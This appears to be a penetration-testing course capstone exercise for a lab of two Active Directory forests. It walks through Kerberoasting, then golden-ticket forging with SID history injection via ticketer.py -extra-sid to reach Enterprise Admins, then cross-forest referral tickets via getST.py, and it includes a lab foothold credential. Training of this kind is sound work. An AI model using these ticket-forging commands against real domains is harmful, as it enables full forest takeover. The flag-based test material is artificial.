    Exercise 6.2: Track Capstone, Multi-Domain (Mini-GOAD)

    Before You Begin

    The track capstone is the bridge to GOAD. Five VMs, three domains, two trust relationships, four flags. The exercise is the explicit GOAD-Light readiness gate: students who finish this should be able to clone GOAD, drop in unaided, and immediately recognize every misconfiguration. There is no walkthrough. The deliverable is the four flags plus a multi-page engagement narrative.

    You will use everything you learned in Levels 1-5: enumeration, BloodHound, ACL abuse, ADCS, delegation, ticket forging. The new techniques unique to this exercise are trust traversal: SID history injection across a parent-child trust, and external trust authentication into a partner forest.

    Tools required: the entire Kali AD toolkit. Rubeus, mimikatz, impacket, bloodyAD, BloodHound, certipy. Pre-installed.

    Scenario

    Priya: "The auditor wants to know what happens if a phishing payload lands at the corp tier. Show me. Specifically: prove you can reach Enterprise Admins in the parent forest, then prove the logistics partner trust is also compromisable from there. I want four flags, one per domain milestone."

    Topology:

    Forest 1: nordport.local
   Parent DC:  npdc01.nordport.local            (Enterprise Admins live here)
   Child DC:   corp-dc01.corp.nordport.local    (foothold starts here)
   Member:     mfgsql01.corp.nordport.local

Forest 2: logistics.local                       (one-way external trust:
                                                 logistics trusts nordport)
   DC:         logdc01.logistics.local
   Member:     logfs01.logistics.local

Trust relationships:
  nordport.local <-> corp.nordport.local        Parent-child (transitive, intra-forest)
  logistics.local --trusts--> nordport.local    One-way external (cross-forest)

    Flags:

    # Tier File Privilege required
    1 Corp Tier 1 \\mfgsql01\C$\corp_tier1_<token>.txt Server admin / DBA
    2 Corp Tier 0 \\corp-dc01\C$\corp_tier0_<token>.txt Domain Admin (corp)
    3 Nordport EA \\npdc01\C$\np_ea_<token>.txt Enterprise Admins (parent)
    4 Logistics \\logfs01\C$\log_<token>.txt Privileged user (logistics); final flag

    Time budget: 8 to 12 hours across multiple sittings.

    Foothold credential: j.chen / Welcome2026# in corp.nordport.local.

    Trust Type Comparison

    The table below tells you what to expect from each trust type when you reach for cross-domain attacks.

    Trust type Direction Transitive? SID Filtering default Useful attack
    Parent-child (intra-forest) bidirectional yes OFF SID history injection (Phase 3)
    Tree-root (intra-forest) bidirectional yes OFF SID history injection
    External (cross-forest) one-way (typical) no ON Referral TGT (Phase 4); ACL abuse
    Forest trust (with selective auth) bidirectional yes (with caveats) ON + selective auth Limited; depends on selective ACLs

    Recommended Phases

    Phase 0: Engagement Setup (target: ~10 minutes)

    A multi-domain capstone produces a lot of evidence. Set up the directory tree before you start so each phase has a clean dropzone.

    Kali - Multi-domain scaffolding

    mkdir -p ~/work/adpt-capstone-2/{recon,phase1-corp-t1,phase2-corp-t0,phase3-ea,phase4-logistics,evidence}
cd ~/work/adpt-capstone-2
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) -- multi-domain engagement start" >> evidence/timeline.txt
cat > evidence/scope.txt <<EOF
Token: ${OCR_SCOPE_TOKEN}
Forests: nordport.local, logistics.local
Foothold: j.chen / Welcome2026# in corp.nordport.local
Final flag location: \\\\logfs01\\C\$\\log_${OCR_SCOPE_TOKEN}.txt
EOF
    Token Effect
    phase{1..4}-* directories One bucket per phase; ccache files, BloodHound zips, hashes, screenshots all land here.
    evidence/timeline.txt Chronological log; every phase boundary appends a line.
    evidence/scope.txt Re-stating the scope in writing prevents accidental cross-trust collateral damage on the wrong tenant.

    Plan for the 8-12 hour budget by setting a phase-end checkpoint where you save progress: cached tickets, dumped hashes, BloodHound JSONs. If a session ends mid-phase, you can resume without re-doing earlier phases.

    Phase 1: Corp Tier 1 (target: ~120 minutes)

    Familiar territory. Foothold credential -> Kerberoast SQL service account -> xp_cmdshell -> SYSTEM on mfgsql01 -> read Tier 1 flag.

    Same playbook as Capstone 6.1 but you start with j.chen already.

    Phase 2: Corp Tier 0 (target: ~180 minutes)

    From server admin / DBA, reach Domain Admin in corp.nordport.local. Multiple paths: ADCS ESC1 if templates are vulnerable; constrained delegation if a service account targets DC services; LSASS dump on mfgsql01 if a higher-privileged account ever logged in.

    End-state: krbtgt hash of corp.nordport.local.

    Phase 3: Cross-Trust to Enterprise Admins (target: ~240 minutes)

    Cross-trust SID history injection is the new technique for this exercise. The parent-child trust is transitive within the forest and supports SID history. Once you have krbtgt of the child, you forge a golden ticket for the child domain, then enrich the PAC with the parent's Enterprise Admins SID via SidHistory. The parent KDC honors the SidHistory claim and treats you as an Enterprise Admin.

    The diagram below traces the cross-trust traversal at the protocol level. Watch where the ExtraSids field is added and how the parent KDC honors it.

    sequenceDiagram
    autonumber
    participant A as Attacker (Kali)
    participant CK as Child KDC<br/>(corp-dc01)
    participant PK as Parent KDC<br/>(npdc01)
    participant T as Target service<br/>(npdc01 C$)

    Note over A: ticketer.py forges TGT for corp.nordport.local<br/>signs with corp krbtgt<br/>injects ExtraSids = <parent_sid>-519
    A->>CK: TGS-REQ for cifs/npdc01.nordport.local<br/>(forged TGT in padata)
    CK-->>A: cross-realm referral TGT<br/>(includes ExtraSids in PAC)
    A->>PK: TGS-REQ for cifs/npdc01.nordport.local<br/>(referral TGT in padata)
    PK-->>A: TGS for Administrator-as-EnterpriseAdmin<br/>(parent KDC honors ExtraSids)
    A->>T: AP-REQ via SMB
    T-->>A: SMB session with EA rights

    The technique: Inter-Realm SID History Injection

    1. Possess corp.nordport.local krbtgt hash
2. Forge a golden ticket for corp.nordport.local (Administrator)
3. Mint that ticket WITH SidHistory containing nordport.local Enterprise Admins SID:
       <parent_domain_sid>-519
4. Use the forged ticket to request a TGS for a service in nordport.local
5. The parent KDC sees ExtraSids in the PAC, evaluates as Enterprise Admin
6. Read \\npdc01\C$\np_ea_<token>.txt

    ticketer.py supports this with the -extra-sid flag:

    ticketer.py \
  -nthash <corp_krbtgt_hash> \
  -domain-sid <CORP_DOMAIN_SID> \
  -domain corp.nordport.local \
  -extra-sid '<PARENT_DOMAIN_SID>-519' \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  EnterpriseAdmin
    Flag Effect
    -nthash <child_krbtgt> Forging key from Phase 2's DCSync.
    -domain-sid <CHILD_SID> Child domain SID (corp.nordport.local).
    -extra-sid '<PARENT_SID>-519' Append parent forest's Enterprise Admins SID to the PAC's ExtraSids.
    -user-id 500 -groups 513,512,... Standard golden-ticket admin profile.
    EnterpriseAdmin Username string; AD never sees it.

    Then access the parent DC:

    export KRB5CCNAME=EnterpriseAdmin.ccache
smbclient //npdc01.nordport.local/C$ -k

    The path: child KDC issues a referral TGT with the ExtraSids passed through; parent KDC honors the SID claim because intra-forest trusts do not filter SIDs; SMB on the parent DC sees Administrator-as-EA and grants access to C$.

    The defender mitigation is SID Filtering on the parent-child trust, which strips foreign SIDs from cross-trust PACs. Microsoft enables it by default on external trusts, but NOT on intra-forest parent-child trusts (since the parent and child are considered the same security boundary). The intra-forest exemption is exactly the gap exploited.

    Phase 4: External Trust to Logistics (target: ~180 minutes)

    logistics.local has a one-way external trust to nordport.local. That means logistics trusts nordport's authentications. With Enterprise Admin in nordport, you can request referral tickets into logistics.

    The technique: External Trust Traversal

    External trusts use a different SID Filtering policy than intra-forest trusts. By default, Microsoft enables SID Filtering on external trusts to PREVENT SID history injection (the parent-child trick from Phase 3 does NOT work cross-forest). However, an authenticated nordport user can still authenticate to services in logistics that explicitly grant them access; typically via cross-trust ACLs.

    The simpler path: use the trust to request a TGS for a logistics service.

    export KRB5CCNAME=EnterpriseAdmin.ccache    # from Phase 3
getST.py -spn cifs/logfs01.logistics.local \
  -dc-ip <nordport_dc_ip> \
  nordport.local/EnterpriseAdmin

    The KDC for nordport.local produces a referral TGT for logistics.local, then you exchange that for a TGS to cifs/logfs01.logistics.local. The logistics DC validates the inter-realm ticket, sees the trust permits it, and issues. You authenticate to logfs01 and read the file.

    Flag Effect
    -spn <svc>/<host>.<external_realm> Target service in the foreign realm.
    -dc-ip <local_dc> Local KDC issues the referral; do not point at the foreign DC.
    <local_realm>/<user> Authenticate against your own realm using the cached EA ticket.

    If straight referral does not work because the per-token configuration restricts access, fall back to using the EA-equivalent tickets to write your own SID into a logistics ACL via cross-trust GenericWrite.

    End-state: read the final flag, in the form OCR{...}, and submit its contents verbatim.

    Common pitfalls in multi-domain runs

    • Wrong domain SID: every domain has its own SID. Phase 3 needs the child SID for -domain-sid and the parent SID for -extra-sid. Mixing them produces a ticket the parent rejects.
    • Trust replication delay: a freshly seeded trust may not be active across both DCs immediately. If Phase 4's referral returns KRB_AP_ERR_BAD_INTEGRITY, wait 5 minutes and retry.
    • SID Filtering on: some lab variants enable SID Filtering on the parent-child trust to test that you recognize the difference. If -extra-sid is silently stripped, fall back to a cross-trust ACL path (BloodHound --collectionmethod ACL for both forests).
    • Cross-realm clock skew: Kerberos enforces 5-minute clock skew per realm boundary. Sync Kali to the closest DC if any cross-realm AP-REQ fails on time.
    • ccache pollution between phases: each phase produces its own ccache. Keep them in phase{N}-*/ directories and explicitly KRB5CCNAME=<full path> per phase; do not rely on the default cache slot.
    • Cleanup is multi-domain: ACLs you wrote, computer accounts you created, golden tickets in caches; track them per-domain in evidence/timeline.txt and revert at the end.

    Key Takeaways

    • Trust relationships are first-class attack surfaces; learn the four kinds (parent-child, tree-root, external, forest with quarantine) and their default SID Filtering behavior.
    • Parent-child trusts inside a forest do NOT filter SIDs; SID history injection works.
    • External trusts filter SIDs by default; the lateral movement happens via referral tickets and cross-trust ACLs.
    • ticketer.py -extra-sid is the SID history injection workhorse.
    • The graduation criterion for this track is "drop into GOAD-Light unaided"; if you finished this exercise, you are ready.
